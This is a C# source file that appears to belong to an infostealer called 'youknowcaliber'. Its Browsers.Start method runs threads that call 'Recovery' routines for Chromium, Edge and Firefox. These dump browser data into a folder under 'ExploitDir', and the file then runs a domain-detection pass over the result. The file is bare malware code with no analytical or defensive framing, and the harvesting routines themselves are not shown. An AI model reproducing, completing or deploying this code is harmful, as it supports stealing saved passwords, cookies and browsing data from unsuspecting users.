﻿using System;
using System.Collections.Generic;
using System.Threading;
using youknowcaliber.Chromium;
using youknowcaliber.Edge;
using youknowcaliber.Firefox;

namespace youknowcaliber
{
	internal class Browsers
	{
		public static void Start()
		{
			string zxczxc = Help.ExploitDir;
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread(delegate()
				{
					youknowcaliber.Chromium.Recovery.Run(zxczxc + "\\Browsers");
					youknowcaliber.Edge.Recovery.Run(zxczxc + "\\Browsers");
				}));
				list.Add(new Thread(delegate()
				{
					youknowcaliber.Firefox.Recovery.Run(zxczxc + "\\Browsers");
				}));
				foreach (Thread thread in list)
				{
					thread.Start();
				}
				foreach (Thread thread2 in list)
				{
					thread2.Join();
				}
				URLSearcher.GetDomainDetect(zxczxc + "\\Browsers\\");
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
